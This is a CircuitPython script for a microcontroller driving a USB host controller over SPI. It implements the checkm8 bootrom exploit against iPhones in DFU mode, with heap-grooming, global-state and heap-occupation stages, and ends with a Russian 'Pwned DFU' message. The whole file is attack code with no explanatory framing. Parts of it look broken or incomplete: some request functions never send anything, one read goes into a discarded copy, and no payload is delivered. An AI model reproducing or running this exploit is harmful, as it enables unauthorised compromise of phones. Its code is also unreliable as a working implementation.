import time
import board
import busio
import digitalio

spi = busio.SPI(board.GP18, board.GP19, board.GP16)
cs = digitalio.DigitalInOut(board.GP17)
cs.direction = digitalio.Direction.OUTPUT
cs.value = True

def reg_wr(reg, val):
    while not spi.try_lock():
        pass
    try:
        cs.value = False
        spi.write(bytearray([(reg << 3) | 2, val]))
        cs.value = True
    finally:
        spi.unlock()

def reg_rd(reg):
    while not spi.try_lock():
        pass
    try:
        cs.value = False
        spi.write(bytearray([(reg << 3)]))
        buf = bytearray(1)
        spi.readinto(buf)
        cs.value = True
        return buf[0]
    finally:
        spi.unlock()

def bytes_wr(reg, n, data):
    while not spi.try_lock():
        pass
    try:
        cs.value = False
        spi.write(bytearray([(reg << 3) | 2]))
        spi.write(data[:n])
        cs.value = True
    finally:
        spi.unlock()

def bytes_rd(reg, n, data):
    while not spi.try_lock():
        pass
    try:
        cs.value = False
        spi.write(bytearray([(reg << 3)]))
        spi.readinto(data[:n])
        cs.value = True
    finally:
        spi.unlock()

CHECKM8_INIT_RESET = 0
CHECKM8_HEAP_FENG_SHUI = 1
CHECKM8_SET_GLOBAL_STATE = 2
CHECKM8_HEAP_OCCUPATION = 3
CHECKM8_END = 4

checkm8_state = CHECKM8_INIT_RESET
last_state = None
is_apple_dfu = True
serial_idx = 0xFF
rcode = 0
padding = 0x60

def send_out(io_buf, pktsize):
    bytes_wr(0x04, pktsize, io_buf)
    reg_wr(0x06, pktsize)
    reg_wr(0x07, 0x01)
    
    timeout = 1000
    while not (reg_rd(0x03) & 0x08):
        timeout -= 1
        if timeout <= 0:
            print("TIMEOUT on send_out!")
            return 1
        time.sleep(0.001)
        
    reg_wr(0x03, 0x08)
    return reg_rd(0x05) & 0x0F

def heap_feng_shui_req(sz, intok):
    global serial_idx
    setup_rcode = 0
    io_buf = bytearray(0x40)
    data_rcode = 0

    if intok:
        data_rcode = 0
        pktsize = reg_rd(0x0A)
        bytes_rd(0x09, pktsize, io_buf)
        reg_wr(0x03, 0x04)

    return setup_rcode

def heap_feng_shui():
    global rcode
    print("1. heap feng-shui")
    reg_wr(0x08, 0x02)
    success = 0
    while success != 620:
        if heap_feng_shui_req(0x80, True) == 0:
            success += 1
    heap_feng_shui_req(0x81, True)
    print("heap feng-shui done")

def set_global_state():
    global rcode, checkm8_state
    print("2. set global state")
    tmpbuf = bytearray(0x40)
    for i in range(0x40):
        tmpbuf[i] = 0xCC

    reg_wr(0x07, 0x12)
    rcode = send_out(tmpbuf, 0x40)
    rcode = send_out(tmpbuf, 0x40)
    reg_wr(0x07, 0x0D)
    
    for i in range(((padding + 0x40) // 0x40)):
        io_buf = bytearray(0x40)
        rcode = send_out(io_buf, 0x40)
        if rcode:
            print("sending error")
            checkm8_state = CHECKM8_END
            return
    print("set global state done")

def heap_occupation():
    global rcode, checkm8_state
    print("3. heap occupation")
    reg_wr(0x08, 0x02)
    heap_feng_shui_req(0x81, True)
    
    tmpbuf = bytearray(0x40)
    for i in range(0x40):
        tmpbuf[i] = 0xCC
    send_out(tmpbuf, 0x40)
    print("heap occupation done")

def main():
    global checkm8_state, is_apple_dfu, serial_idx, last_state
    print("checkm8 started")
    time.sleep(0.5)

    while True:
        if checkm8_state == CHECKM8_INIT_RESET:
            for _ in range(3):
                time.sleep(0.5)
            checkm8_state = CHECKM8_HEAP_FENG_SHUI
            
        elif checkm8_state == CHECKM8_HEAP_FENG_SHUI:
            heap_feng_shui()
            checkm8_state = CHECKM8_SET_GLOBAL_STATE
            
        elif checkm8_state == CHECKM8_SET_GLOBAL_STATE:
            set_global_state()
            if checkm8_state != CHECKM8_END:
                checkm8_state = CHECKM8_HEAP_OCCUPATION
            
        elif checkm8_state == CHECKM8_HEAP_OCCUPATION:
            heap_occupation()
            checkm8_state = CHECKM8_END
            
        elif checkm8_state == CHECKM8_END:
            print("iPhone теперь в Pwned dfu!")
            checkm8_state = -1

        time.sleep(0.1)

if __name__ == "__main__":
    main()
